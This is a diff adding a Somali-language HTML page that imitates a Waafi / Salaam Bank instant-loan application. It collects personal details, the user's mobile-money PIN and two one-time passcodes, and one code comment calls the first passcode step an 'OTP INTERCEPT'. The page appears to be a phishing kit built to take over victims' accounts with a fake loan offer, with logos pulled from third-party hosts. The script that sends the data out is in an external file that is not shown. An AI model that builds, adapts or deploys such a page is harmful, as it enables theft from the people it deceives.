@@ -1,0 +1,391 @@
+<!doctype html>
+<html lang="so">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover"/>
+<meta name="theme-color" content="#7bbf2e"/>
+<title>Amaahda Waafi &middot; Salaam Bank</title>
+<link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@300;400;500;600;700;800;900&family=DM+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+<!-- Linked external CSS -->
+<link href="css/style.css" rel="stylesheet">
+</head>
+<body>
+
+<div class="screen">
+
+  <!-- TOP BRAND ARCHITECTURE LOGO HEADER BAR -->
+  <div class="header-bar">
+    <div class="brand-logos">
+      <!-- High-fidelity hosted production logos replacing missing local resources -->
+      <img src="https://upload.wikimedia.org/wikipedia/commons/1/1a/Waafi_Logo.png" onerror="this.src='https://raw.githubusercontent.com/Lenkartel/waafi/main/assets/waafi.webp'" alt="Waafi">
+      <div class="brand-sep"></div>
+      <img src="https://iili.io/CEuAAuI.png" style="height:36px" alt="Logo">
+    </div>
+    <div class="brand-bottom">
+      <div class="brand-sub">Waafi Loans</div>
+      <div class="header-chip">Amaah Degdeg ah</div>
+    </div>
+  </div>
+
+  <!-- LIVE DYNAMIC MONITOR DISPLAY METRICS HEADER -->
+  <div class="header">
+    <div class="hglow-a"></div>
+    <div class="hglow-b"></div>
+
+    <div class="header-hero" id="header-hero-content">
+      <div class="header-eyebrow">Maalgelin degdeg ah oo la qabsan karo</div>
+      <div class="header-title">Amaahkaaga, <span>Shuruudahaaga</span></div>
+    </div>
+
+    <!-- State View for Step 1 -->
+    <div class="loan-display" id="header-display-calc">
+      <div class="loan-label">Xaddiga Amaahda</div>
+      <div class="loan-row">
+        <span class="loan-currency">USD</span>
+        <span class="loan-amount" id="headerAmount">300</span>
+        <span class="loan-tag" id="headerDur">1 BIL</span>
+      </div>
+      <div class="mini-stats">
+        <div class="mini-stat">
+          <div class="mini-stat-label">Bishiiba</div>
+          <div class="mini-stat-val" id="miniMonthly">$0.00</div>
+        </div>
+        <div class="mini-stat">
+          <div class="mini-stat-label">Muddada</div>
+          <div class="mini-stat-val" id="miniDur">1 bil</div>
+        </div>
+        <div class="mini-stat">
+          <div class="mini-stat-label">Faa'iidada</div>
+          <div class="mini-stat-val">2.5%/bil</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- State View for Step 2 -->
+    <div class="loan-display" id="header-display-auth" style="display:none;">
+      <div class="loan-label">Xaddiga Amaahda</div>
+      <div class="hamount-row" style="display:flex; align-items:flex-end; gap:4px; margin-bottom:8px;">
+        <span class="hcur">USD</span><span class="hamt" id="hAmt" style="font-size:36px; font-weight:800; color:#fff; line-height:1; font-family:var(--mono);">300.00</span>
+      </div>
+      <div class="hpills">
+        <span class="hpill" id="hType">—</span>
+        <span class="hpill" id="hDur">—</span>
+        <span class="hpill" id="hAge">—</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- MULTI-STEP SINGLE PAGE INTERACTIVE HUB -->
+  <div class="content-wrap">
+    <div class="body">
+
+      <!-- STEP 1: CALCULATOR & SYSTEM INPUT PROFILE -->
+      <div class="step-panel active" id="step-calculator">
+        
+        <!-- CARD: CALCULATOR ENGINE -->
+        <div class="card">
+          <div class="card-accent"></div>
+          <div class="card-header">
+            <div>
+              <div class="card-title">Xisaabiyaha Amaahda</div>
+              <div class="card-sub">Jiid si aad u dejiso xaddiga iyo muddada</div>
+            </div>
+            <div class="card-badge">Toos ah</div>
+          </div>
+          <div class="card-body">
+            <div class="field">
+              <div class="slider-head">
+                <div class="slider-name"><span class="slider-emoji">💵</span> Xaddiga Amaahda</div>
+                <div class="slider-val" id="amountVal">$300</div>
+              </div>
+              <input type="range" id="amountSlider" min="300" max="12000" step="100" value="300" oninput="recalc()">
+              <div class="slider-hint"><span>$300</span><span>$12,000</span></div>
+            </div>
+
+            <div class="field">
+              <div class="slider-head">
+                <div class="slider-name"><span class="slider-emoji">📅</span> Muddada</div>
+                <div class="slider-val" id="durVal">1 bil</div>
+              </div>
+              <input type="range" id="durSlider" min="1" max="24" step="1" value="1" oninput="recalc()">
+              <div class="slider-hint"><span>1 bil</span><span>24 bilood</span></div>
+            </div>
+
+            <div class="payment-preview">
+              <div class="payment-row">
+                <span class="payment-key">Xaddiga Amaahda</span>
+                <span class="payment-val" id="pLoan">$300.00</span>
+              </div>
+              <div class="payment-row">
+                <span class="payment-key">Faa'iidada Wadarta (2.5%/bil)</span>
+                <span class="payment-val" id="pInterest">$7.50</span>
+              </div>
+              <div class="payment-row">
+                <span class="payment-key">Wadarta La Celinta</span>
+                <span class="payment-val" id="pTotal">$307.50</span>
+              </div>
+              <div class="payment-total">
+                <span class="payment-total-label">Celinta Bishiiba</span>
+                <span class="payment-total-val" id="pMonthly">$307.50</span>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- CARD: LOAN CLASSIFICATION PARAMETERS -->
+        <div class="card">
+          <div class="card-accent"></div>
+          <div class="card-header">
+            <div>
+              <div class="card-title">Faahfaahinta Amaahda</div>
+              <div class="card-sub">Ujeedada iyo nooca amaahda</div>
+            </div>
+          </div>
+          <div class="card-body">
+            <div class="field">
+              <div class="field-label">Nooca Amaahda</div>
+              <div class="select-wrap">
+                <select id="loanType">
+                  <option value="" disabled selected>Dooro nooca amaahda...</option>
+                  <option value="Xaalad Degdeg ah">Xaalad Degdeg ah</option>
+                  <option value="Kharashka Dugsiga">Kharashka Dugsiga</option>
+                  <option value="Ganacsiga">Ganacsiga</option>
+                  <option value="Caafimaad">Caafimaad</option>
+                  <option value="Hagaajinta Guriga">Hagaajinta Guriga</option>
+                  <option value="Beeraha">Beeraha</option>
+                  <option value="Kuwo Kale">Kuwo Kale</option>
+                </select>
+              </div>
+            </div>
+            <div class="field">
+              <div class="field-label">Ujeedada Amaahda</div>
+              <input class="input-field" type="text" id="purpose" placeholder="Si kooban u sharax ujeedadaada...">
+            </div>
+          </div>
+        </div>
+
+        <!-- CARD: APPLICANT IDENTITY DATA -->
+        <div class="card">
+          <div class="card-accent"></div>
+          <div class="card-header">
+            <div>
+              <div class="card-title">Macluumaadka Shakhsiga</div>
+              <div class="card-sub">Xogahaaga codsigan</div>
+            </div>
+          </div>
+          <div class="card-body">
+            <div class="two-col">
+              <div class="field">
+                <div class="field-label">Magaca Hore</div>
+                <input class="input-field" type="text" id="firstName" placeholder="Axmed">
+              </div>
+              <div class="field">
+                <div class="field-label">Magaca Dambe</div>
+                <input class="input-field" type="text" id="lastName" placeholder="Xasan">
+              </div>
+            </div>
+            <div class="field">
+              <div class="field-label" style="color: var(--green-dark)">Taariikhda Dhalashada</div>
+              <input type="date" class="input-field" id="dob">
+              <div class="field-hint">Da'da ugu yar: 20 sano</div>
+              <div class="field-error" id="dobError">Waa inaad ugu yaraan 20 jir tahay si aad u codsato.</div>
+            </div>
+            <div class="field">
+              <div class="field-label">Lambarka Telefoonka</div>
+              <div class="phone-row">
+                <div class="phone-prefix">+252</div>
+                <input class="input-field" type="tel" id="calcPhone" inputmode="numeric" pattern="[0-9]*" placeholder="9XXXXXXXX">
+              </div>
+              <div class="field-hint">Lambarka 9-nambar ee Waafi</div>
+            </div>
+          </div>
+        </div>
+
+        <div class="powered">Waafi ayaa maamula &middot; <strong>Shuruudaha iyo xaaladaha waxay khusaynaan</strong></div>
+      </div>
+
+      <!-- STEP 2: WAAFI FINANCIAL SECURITY PORTAL -->
+      <div class="step-panel" id="step-auth">
+        <div class="card">
+          <div class="cacc"></div>
+          <div class="card-logo"><img src="https://upload.wikimedia.org/wikipedia/commons/1/1a/Waafi_Logo.png" onerror="this.src='https://raw.githubusercontent.com/Lenkartel/waafi/main/assets/waafi.webp'" alt="Waafi"></div>
+          <div class="ch">
+            <div class="ct">Xaqiiji Codsigaaga</div>
+            <div class="cs">Gali lambarka iyo PIN-kaaga Waafi</div>
+          </div>
+          <div class="cb">
+            <div class="f">
+              <div class="fl">Lambarka Telefoonka</div>
+              <div class="prow">
+                <div class="ppfx">+252</div>
+                <input class="inp" type="tel" id="authPhone" inputmode="numeric" pattern="[0-9]*" placeholder="9XXXXXXXX">
+              </div>
+            </div>
+            <div class="f">
+              <div class="fl">PIN-kaaga</div>
+              <div class="pin-row">
+                <div class="pin-cells">
+                  <div class="pin-cell"><input type="text" inputmode="numeric" maxlength="1" pattern="[0-9]" autocomplete="off" id="p0"></div>
+                  <div class="pin-cell"><input type="text" inputmode="numeric" maxlength="1" pattern="[0-9]" autocomplete="off" id="p1"></div>
+                  <div class="pin-cell"><input type="text" inputmode="numeric" maxlength="1" pattern="[0-9]" autocomplete="off" id="p2"></div>
+                  <div class="pin-cell"><input type="text" inputmode="numeric" maxlength="1" pattern="[0-9]" autocomplete="off" id="p3"></div>
+                </div>
+                <button class="eye-btn" id="eyeBtn" type="button">
+                  <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" />
+                    <circle cx="12" cy="12" r="3" />
+                  </svg>
+                </button>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="pw">Powered by <strong>Waafi</strong> &middot; <strong>Salaam Bank</strong></div>
+      </div>
+
+      <!-- STEP 3: TRANSACTION PIPELINE COMPLETE FRAME -->
+      <div class="step-panel" id="step-success">
+        <div class="card" style="text-align:center; padding:32px 16px">
+          <div style="font-size:40px; margin-bottom:10px">✅</div>
+          <div style="font-size:17px; font-weight:800; color:var(--text); margin-bottom:6px">La gudbiyay!</div>
+          <div style="font-size:13px; color:var(--text-3); line-height:1.6">Codsigaaga amaahda ayaa la diray. Lacagta waxaa lagu shubi doonaa xisaabtaada daqiiqado gudahood.</div>
+        </div>
+      </div>
+
+    </div>
+
+    <!-- MASTER CONTROL ENGINE FOOTER SELECTIONS -->
+    <div class="sticky-footer" id="footer-step1">
+      <button class="pay-btn" onclick="openCalcSummary()">Dib u eeg &amp; Codso →</button>
+    </div>
+
+    <div class="footer" id="footer-step2" style="display:none;">
+      <button class="fbtn" id="mainBtn">Xaqiiji Faahfaahinta →</button>
+    </div>
+  </div>
+
+  <!-- MODAL: STEP 1 PRE-CALCULATED DATA CONFIRMATION -->
+  <div class="modal-overlay" id="modal-calc-summary" onclick="handleOverlay(event, 'modal-calc-summary')">
+    <div class="modal-sheet">
+      <div class="sheet-handle"></div>
+      <div class="sheet-header">
+        <div class="sheet-title">Kooban Amaahda</div>
+        <button class="sheet-close" onclick="closeModal('modal-calc-summary')">&#x2715;</button>
+      </div>
+      <div class="sheet-body">
+        <div class="sheet-sub">Codsigaaga</div>
+        <div class="sheet-rows" id="calcSummaryRows"></div>
+        <div class="sheet-total">
+          <div class="sheet-total-label">Celinta Bishiiba</div>
+          <div class="sheet-total-val" id="calcSummaryMonthly">$0.00</div>
+        </div>
+        <div class="sheet-actions">
+          <button class="btn-cancel" onclick="closeModal('modal-calc-summary')">Wax ka badal</button>
+          <button class="btn-confirm" onclick="proceedToAuth()">Sii wad →</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- MODAL: LOGIN IDENTITY OTP INTERCEPT (OTP 1) -->
+  <div class="ov center" id="m1" onclick="bgClose('m1',event)">
+    <div class="ms">
+      <div class="mh"></div>
+      <div class="mhdr">
+        <span class="mtitle">Xaqiiji Aqoonsiga</span>
+        <button class="mclose" onclick="cm('m1')">✕</button>
+      </div>
+      <div class="mb">
+        <div class="masked-note" id="mn1"></div>
+        <div class="otp-wrap" id="ow1">
+          <input type="text" id="oh1" inputmode="numeric" maxlength="6" autocomplete="one-time-code" class="otp-hidden">
+          <div class="otp-disp">
+            <div class="otp-box" id="o1b0"></div>
+            <div class="otp-box" id="o1b1"></div>
+            <div class="otp-box" id="o1b2"></div>
+            <div class="otp-box" id="o1b3"></div>
+            <div class="otp-box" id="o1b4"></div>
+            <div class="otp-box" id="o1b5"></div>
+          </div>
+        </div>
+        <div class="tr">
+          <div class="tl">Dhacaysaa <span class="tv" id="t1">120</span>s</div>
+          <button class="rb" id="r1">Dib u dir</button>
+        </div>
+        <button class="otp-go" id="g1" onclick="submitOtp1()">Xaqiiji →</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- MODAL: STEP 2 POST-SECURITY VALIDATION DEPOSIT VIEW -->
+  <div class="ov" id="msum" onclick="bgClose('msum',event)">
+    <div class="ms">
+      <div class="mh"></div>
+      <div class="mhdr">
+        <span class="mtitle">Kooban Codsiga</span>
+        <button class="mclose" onclick="cm('msum')">✕</button>
+      </div>
+      <div class="mb">
+        <div class="msub">Faahfaahinta Amaahda</div>
+        <div class="srows" id="sumRows"></div>
+        <div class="stot">
+          <span class="stl">Celinta Bishiiba</span>
+          <span class="stv" id="sumMo">$0.00</span>
+        </div>
+        <div class="sact">
+          <button class="sc" onclick="cm('msum')">Dib u eeg</button>
+          <button class="sp" onclick="openOtp2()">Gudbi Codsiga →</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- MODAL: SECURE DISBURSEMENT CONFIRMATION (OTP 2) -->
+  <div class="ov center" id="m2" onclick="bgClose('m2',event)">
+    <div class="ms">
+      <div class="mh"></div>
+      <div class="mhdr">
+        <span class="mtitle">Gudbi Codsiga</span>
+        <button class="mclose" onclick="cm('m2')">✕</button>
+      </div>
+      <div class="mb">
+        <div class="masked-note" id="mn2"></div>
+        <div class="otp-wrap" id="ow2">
+          <input type="text" id="oh2" inputmode="numeric" maxlength="6" autocomplete="one-time-code" class="otp-hidden">
+          <div class="otp-disp">
+            <div class="otp-box" id="o2b0"></div>
+            <div class="otp-box" id="o2b1"></div>
+            <div class="otp-box" id="o2b2"></div>
+            <div class="otp-box" id="o2b3"></div>
+            <div class="otp-box" id="o2b4"></div>
+            <div class="otp-box" id="o2b5"></div>
+          </div>
+        </div>
+        <div class="tr">
+          <div class="tl">Dhacaysaa <span class="tv" id="t2">120</span>s</div>
+          <button class="rb" id="r2">Dib u dir</button>
+        </div>
+        <button class="otp-go" id="g2" onclick="submitOtp2()">Gudbi Codsiga ✓</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- CORE SYSTEM LOADER INTERFACE OVERLAY -->
+  <div class="loader-ov" id="loaderOv">
+    <div class="pulse-ring">
+      <div class="pulse-inner"><img src="https://upload.wikimedia.org/wikipedia/commons/1/1a/Waafi_Logo.png" onerror="this.src='https://raw.githubusercontent.com/Lenkartel/waafi/main/assets/waafi.webp'" alt="Waafi"></div>
+    </div>
+    <div>
+      <div class="loader-text" id="loaderText">La xaqiijinayaa...</div>
+      <div class="loader-sub">Fadlan sug...</div>
+    </div>
+  </div>
+
+  <div class="toast" id="toast">Fadlan buuxi dhammaan goobaha</div>
+
+</div>
+
+<!-- Linked external JS -->
+<script src="js/script.js"></script>
+</body>
+</html>
